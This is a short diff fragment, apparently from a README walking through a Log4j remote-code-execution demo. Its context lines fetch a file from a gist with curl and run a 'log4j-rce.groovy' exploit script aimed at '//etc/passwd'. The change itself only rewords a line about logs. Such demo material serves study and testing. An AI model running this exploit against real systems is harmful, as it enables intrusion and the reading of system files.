@@ -22,4 +22,4 @@ curl https://gist.githubusercontent.com/srt4/4fb4b537bb48599279e0380e097081e2/ra
 groovy log4j-rce.groovy '//etc/passwd'
 ```
 
-At this point, 
+Now the logs should be visible in stages (1) and (2) 
